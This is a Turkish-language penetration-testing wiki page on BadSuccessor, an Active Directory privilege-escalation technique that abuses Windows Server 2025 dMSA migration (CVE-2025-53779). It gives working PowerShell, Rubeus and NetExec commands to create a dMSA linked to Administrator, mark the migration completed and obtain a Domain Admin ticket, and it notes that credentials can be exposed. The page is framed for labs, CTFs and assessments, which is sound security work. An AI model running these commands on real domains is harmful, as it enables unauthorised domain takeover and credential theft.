# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## Genel Bakış

**BadSuccessor**, **Windows Server 2025** içinde tanıtılan **delegated Managed Service Account** (**dMSA**) migration workflow’ünü kötüye kullanır. Bir dMSA, **`msDS-ManagedAccountPrecededByLink`** üzerinden bir legacy account ile bağlanabilir ve **`msDS-DelegatedMSAState`** içinde saklanan migration state’leri üzerinden taşınabilir. Bir attacker yazılabilir bir OU içinde bir dMSA oluşturabiliyor ve bu attributes üzerinde kontrol sağlayabiliyorsa, KDC attacker-controlled dMSA için **bağlı account’un authorization context’i** ile ticket verebilir.

Pratikte bu, yalnızca delegated OU rights’a sahip düşük privilege’lı bir user’ın yeni bir dMSA oluşturup onu `Administrator`’a işaret edebileceği, migration state’i tamamlayabileceği ve ardından PAC’i **Domain Admins** gibi privileged groups içeren bir TGT elde edebileceği anlamına gelir.

## Önemli dMSA migration ayrıntıları

- dMSA, **Windows Server 2025** özelliğidir.
- `Start-ADServiceAccountMigration`, migration’ı **started** state’e alır.
- `Complete-ADServiceAccountMigration`, migration’ı **completed** state’e alır.
- `msDS-DelegatedMSAState = 1`, migration started anlamına gelir.
- `msDS-DelegatedMSAState = 2`, migration completed anlamına gelir.
- Legitimate migration sırasında dMSA, superseded account’un yerine şeffaf biçimde geçecek şekilde tasarlanır; bu yüzden KDC/LSA, önceki account’un zaten sahip olduğu access’i korur.

Microsoft Learn ayrıca migration sırasında original account’un dMSA ile ilişkilendirildiğini ve dMSA’nın eski account’un erişebildiği şeylere erişmesinin amaçlandığını belirtir. BadSuccessor’un kötüye kullandığı security assumption budur.

## Gereksinimler

1. **dMSA mevcut** olan bir domain; bu da AD tarafında **Windows Server 2025** desteğinin bulunduğu anlamına gelir.
2. Attacker, bazı bir OU içinde `msDS-DelegatedManagedServiceAccount` objects oluşturabiliyor olmalı veya orada eşdeğer geniş child-object creation rights’a sahip olmalı.
3. Attacker, ilgili dMSA attributes’lerini **write** edebilmeli ya da yeni oluşturduğu dMSA üzerinde tam kontrol sahibi olmalı.
4. Attacker, domain-joined bir context’ten veya LDAP/Kerberos’a ulaşan bir tunnel üzerinden Kerberos tickets talep edebilmeli.

### Pratik kontroller

En temiz operator sinyali, domain/forest level’ı doğrulamak ve environment’ın zaten yeni Server 2025 stack’ini kullanıp kullanmadığını teyit etmektir:
```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```
`Windows2025Domain` ve `Windows2025Forest` gibi değerler görürseniz, **BadSuccessor / dMSA migration abuse** için bunu öncelikli bir kontrol olarak değerlendirin.

Ayrıca, public tooling ile dMSA oluşturma için delegelenmiş writable OU'ları enumerate edebilirsiniz:
```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```
## Abuse flow

1. Bir OU içinde dMSA oluşturun; burada delegated create-child rights yetkiniz olsun.
2. **`msDS-ManagedAccountPrecededByLink`** değerini, `CN=Administrator,CN=Users,DC=corp,DC=local` gibi ayrıcalıklı bir hedefin DN’sine ayarlayın.
3. Migration’ın completed olarak işaretlenmesi için **`msDS-DelegatedMSAState`** değerini `2` olarak ayarlayın.
4. Yeni dMSA için bir TGT isteyin ve dönen ticket’ı privileged services erişimi için kullanın.

PowerShell example:
```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Ticket request / operational tooling examples:
```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```
## Bu neden privilege escalation’dan daha fazlası

Meşru migration sırasında, Windows ayrıca yeni dMSA’nın cutover öncesinde önceki account için verilen ticket’ları işlemesine ihtiyaç duyar. Bu nedenle dMSA ile ilgili ticket verisi, **`KERB-DMSA-KEY-PACKAGE`** akışında **current** ve **previous** key’leri içerebilir.

Attacker-controlled sahte bir migration için bu davranış, BadSuccessor’u şunlara dönüştürebilir:

- PAC içinde privileged group SID’lerini miras alarak **privilege escalation**.
- **Credential material exposure** çünkü previous-key işlemesi, vulnerable workflow’larda önceki account’un RC4/NT hash’ine eşdeğer material’ı açığa çıkarabilir.

Bu da tekniği hem doğrudan domain takeover hem de pass-the-hash veya daha geniş credential compromise gibi sonraki operasyonlar için kullanışlı hale getirir.

## Patch durumu hakkında notlar

Orijinal BadSuccessor davranışı **yalnızca teorik bir 2025 preview sorunu değildir**. Microsoft bunu **CVE-2025-53779** olarak atadı ve **Ağustos 2025**’te bir security update yayımladı. Bu attack’ı şu durumlar için dokümante edin:

- **labs / CTFs / assume-breach exercises**
- **unpatched Windows Server 2025 ortamları**
- **değerlendirmeler sırasında OU delegations ve dMSA exposure doğrulaması**

Windows Server 2025 domain’inin yalnızca dMSA mevcut diye vulnerable olduğunu varsaymayın; patch seviyesini doğrulayın ve dikkatlice test edin.

## Tools

- [Akamai BadSuccessor tooling](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [NetExec `badsuccessor` module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## References

- [HTB: Eighteen](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [Akamai - BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [Microsoft Learn - Delegated Managed Service Accounts overview](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)

{{#include ../../../banners/hacktricks-training.md}}
